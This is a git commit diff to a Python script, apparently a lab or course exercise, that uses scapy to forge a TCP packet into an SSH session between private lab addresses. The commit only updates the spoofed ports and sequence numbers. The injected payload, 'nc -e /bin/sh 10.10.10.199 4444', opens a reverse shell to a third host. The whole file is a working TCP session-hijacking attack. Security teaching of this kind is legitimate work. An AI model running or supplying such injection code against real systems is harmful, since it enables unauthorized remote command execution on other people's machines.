462a6b9e9d75a992361fddf6235f6d3d85b49786
FishRainBlow <82390676+FishRainBlow@users.noreply.github.com>
2024-07-30 13:44:50 +0800

    Update Q5_rs.py

--- Code Files/Q5_rs.py
+++ Code Files/Q5_rs.py
@@ -3,7 +3,7 @@ import sys
 from scapy.all import *
 
 IPLayer = IP (src="10.10.10.200", dst = "10.10.10.196")
-TCPLayer = TCP (sport=55228, dport=22, flags="A", seq=1436115963, ack=125328576)
+TCPLayer = TCP (sport=42724, dport=22, flags="A", seq=282522456, ack=3527843461)
 
 data = "\n nc -e /bin/sh 10.10.10.199 4444 \n"
 
